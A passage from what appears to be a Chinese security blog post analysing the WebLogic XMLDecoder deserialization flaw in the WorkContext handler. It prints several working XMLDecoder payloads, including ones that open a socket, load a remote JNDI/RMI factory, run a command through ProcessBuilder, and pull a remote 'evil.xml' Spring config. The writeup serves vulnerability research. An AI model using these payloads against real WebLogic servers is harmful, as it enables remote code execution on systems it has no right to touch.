class="line">            <span class="keyword">this</span>.receive(var6);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (XMLStreamException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> WebServiceException(var7);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> WebServiceException(var8);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中的<strong>WorkContextXmlInputAdapter</strong>构造方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">WorkContextXmlInputAdapter</span><span class="params">(InputStream var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.xmlDecoder = <span class="keyword">new</span> XMLDecoder(var1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>readObject的触发点</p>
<ul>
<li><p><strong>WorkContextLocalMap</strong></p>
<p><img src="https://i.loli.net/2021/01/05/EKNy8SuXZl6UaQP.png" alt="image-20210105201826298"></p>
</li>
<li><p><strong>WorkContextEntryImpl</strong></p>
<p><img src="https://i.loli.net/2021/01/29/dLtN69wEZOj8DJX.png" alt="image-20210105201921804"></p>
</li>
<li><p><strong>WorkContextXmlInputAdapter</strong></p>
<p><img src="https://i.loli.net/2021/01/05/75M9KxlqwgUFyh8.png" alt="image-20210105202004223"></p>
</li>
</ul>
</li>
</ol>
<h3 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h3><p>poc并不能直接打，要自己加上soap结构。</p>
<ol>
<li><p>socket，使用socket类直接调用响应构造器。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.net.Socket"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>10.211.55.2<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>8881<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(String host, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> UnknownHostException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(host != <span class="keyword">null</span> ? <span class="keyword">new</span> InetSocketAddress(host, port) :</span><br><span class="line">             <span class="keyword">new</span> InetSocketAddress(InetAddress.getByName(<span class="keyword">null</span>), port),</span><br><span class="line">             (SocketAddress) <span class="keyword">null</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>远程nc监听看到来自本机的连接即可。</p>
</li>
<li><p>jndi</p>
<p>java原生类jndi的利用方式，因为autoCommit是私有属性，所以如果设置属性就会调用<strong>setAutoCommit</strong>方法，触发<strong>connect</strong>到<strong>DataSource.lookup</strong>方法加载远程工厂类。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">"dataSourceName"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">string</span>&gt;</span>rmi://10.211.55.2:1099/Foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">"autoCommit"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>命令执行</p>
<p>有两种，一种是调用<strong>processBuilder</strong>，另外一种是调用<strong>weblogic.nodemanager.client.ShellClient</strong></p>
<ul>
<li><p><strong>processBuilder</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/Applications/Calculator.app/<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>ShellClient</strong>的poc需要设置一个属性<strong>domainName</strong>，不然没法过<strong>checkConnected</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title">getVersion</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.checkConnected(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">this</span>.execCmd(Command.VERSION);</span><br><span class="line"></span><br><span class="line">        String var1;</span><br><span class="line">        String var2;</span><br><span class="line">        <span class="keyword">for</span>(var2 = <span class="keyword">null</span>; (var1 = <span class="keyword">this</span>.readLine()) != <span class="keyword">null</span>; var2 = var1) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.checkResponse();</span><br><span class="line">        <span class="keyword">return</span> var2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">execCmd</span><span class="params">(Command var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String[] var2 = <span class="keyword">this</span>.getCommandLine(var1, <span class="keyword">this</span>.shellCommand);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.verbose) &#123;</span><br><span class="line">            <span class="keyword">this</span>.stdout.println(<span class="string">"DEBUG: ShellClient: Executing shell command: "</span> + StringUtils.join(var2, <span class="string">" "</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.proc = Runtime.getRuntime().exec(var2);</span><br><span class="line">        <span class="keyword">this</span>.errDrainer = <span class="keyword">new</span> ShellClient.ErrDrainer(<span class="keyword">this</span>.proc.getErrorStream());</span><br><span class="line">        <span class="keyword">this</span>.errDrainer.start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ol>
<ol start="4">
<li><p>二次反序列化</p>
<p>还是两种，分10和12的类，原理都差不多就记录一个。</p>
<ul>
<li><strong>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</strong>，</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.6.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"oracle.toplink.internal.sessions.UnitOfWorkChangeSet"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span>&gt;</span><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"byte"</span> <span class="attr">length</span>=<span class="string">"3104"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">byte</span>&gt;</span>-84<span class="tag">&lt;/<span class="name">byte</span>&gt;</span></span><br><span class="line">                ...</span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span>        </span><br><span class="line">            <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">UnitOfWorkChangeSet</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ByteArrayInputStream byteIn = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream objectIn = <span class="keyword">new</span> ObjectInputStream(byteIn);</span><br><span class="line">        <span class="keyword">this</span>.allChangeSets = (IdentityHashtable)objectIn.readObject();</span><br><span class="line">        <span class="keyword">this</span>.deletedObjects = (IdentityHashtable)objectIn.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里可以直接用jdk的链打回显，个人觉得效果会好些。</p>
</li>
<li><p>利用bean xml</p>
<p>加载spring bean的配置文件。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>+"<span class="attr">com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</span>"&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>http://127.0.0.1:8881/evil.xml<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="检测和利用的思考"><a href="#检测和利用的思考" class="headerlink" title="检测和利用的思考"></a>检测和利用的思考</h3><ol>
<li><p>回显检测</p>
<p>有两个思路，实际上如果反序列化成功会回显<strong>ProcessBuilder</strong>子类的字段，直接匹配就好，另一个就是利用二次反序列化，加载恶意类修改response，写入命令执行结果即可。</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个洞的流程还是比较简单的，主要就是弄清楚xmlDecoder的解析流程之后，soap的几个字段之后，再debug就好理解了，具体的利用还是要结合java中各种常规思路比如二次反序列化，原生链的jndi之类的，找个时间好好写写补丁绕过的部分，感觉是很有意思。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/web/" rel="tag"># web</a>
          
            <a href="/tags/weblogic/" rel="tag"># weblogic</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/12/31/zend%E6%A1%86%E6%9E%B6pop%E9%93%BE%E6%8C%96%E6%8E%98/" rel="next" title="zend框架pop链挖掘">
                <i class="fa fa-chevron-left"></i> zend框架pop链挖掘
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/01/16/duxcms3-1-3%E5%AE%A1%E8%AE%A1/" rel="prev" title="duxcms3.1.3审计">
                duxcms3.1.3审计 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">star</p>
              <p class="site-description motion-element" itemprop="description">ctf wp and technologies about security</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%20%7C%7C%20archive">
              
                  <span class="site-state-item-count">39</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">31</span>
                  <span class="site-state-item-name">tags</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xml-decoder反序列化处理流程"><span class="nav-number">2.</span> <span class="nav-text">xml decoder反序列化处理流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#jdk8下的处理流程"><span class="nav-number">2.1.</span> <span class="nav-text">jdk8下的处理流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jdk6下的处理流程"><span class="nav-number">2.2.</span> <span class="nav-text">jdk6下的处理流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境"><span class="nav-number">3.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞点分析"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞点分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poc分析"><span class="nav-number">3.3.</span> <span class="nav-text">poc分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测和利用的思考"><span class="nav-number">3.4.</span> <span class="nav-text">检测和利用的思考</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">star</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
